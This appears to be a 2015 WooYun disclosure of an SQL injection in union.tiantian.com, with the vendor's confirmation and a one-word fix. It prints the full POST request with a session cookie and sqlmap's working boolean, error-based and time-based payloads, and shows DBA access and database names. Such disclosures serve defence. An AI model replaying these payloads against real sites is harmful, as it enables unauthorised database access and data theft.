wybug_detail:
漏洞详情 披露状态：   									2015-07-28：	细节已通知厂商并且等待厂商处理中									2015-07-28：	厂商已经确认，细节仅向厂商公开									2015-08-07：	细节向核心白帽子及相关领域专家公开									2015-08-17：	细节向普通白帽子公开									2015-08-27：	细节向实习白帽子公开									2015-09-11：	细节向公众公开  简要描述： SQL注入 详细说明：  注入点：http://union.tiantian.com/web.php?m=site&a=site_edit&site_id=150不知道cookie啥时候失效，如果失效了，自己注册一个帐号。注入参数site_idPOST数据包
POST /web.php?m=site&a=site_save HTTP/1.1Host: union.tiantian.comProxy-Connection: keep-aliveContent-Length: 109Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://union.tiantian.comUser-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://union.tiantian.com/web.php?m=site&a=site_edit&site_id=150Accept-Encoding: gzip,deflateAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4Cookie: PHPSESSID=2khg5mgafnmeh7f2e9oduekv16; BIGipServerPool_192.168.106.121_wangmeng_huancun=2037033152.20480.0000site_id=150&site_name=www.baidu.com&site_domain=www.baidu.com&site_type=13&description=adadsasdsaf&dosubmit=+
就在网站管理的地方



   漏洞证明：  
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: site_id (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: site_id=150 AND 1295=1295&site_name=www.baidu.com&site_domain=www.baidu.com&site_type=13&description=adadsasdsaf&dosubmit=     Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: site_id=150 AND (SELECT 8381 FROM(SELECT COUNT(*),CONCAT(0x71787a6a71,(SELECT (CASE WHEN (8381=8381) THEN 1 ELSE 0 END)),0x7171767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&site_name=www.baidu.com&site_domain=www.baidu.com&site_type=13&description=adadsasdsaf&dosubmit=     Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind (SELECT)    Payload: site_id=150 AND (SELECT * FROM (SELECT(SLEEP(5)))ULmx)&site_name=www.baidu.com&site_domain=www.baidu.com&site_type=13&description=adadsasdsaf&dosubmit= ---web application technology: PHP 5.3.17back-end DBMS: MySQL >= 5.0.0current user is DBA:    Trueavailable databases [4]:[*] information_schema[*] mysql[*] performance_schema[*] union_tiantian
   修复方案：  intval   版权声明：转载请注明来源 null_z@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-07-28 11:56 厂商回复： THX 最新状态： 暂无
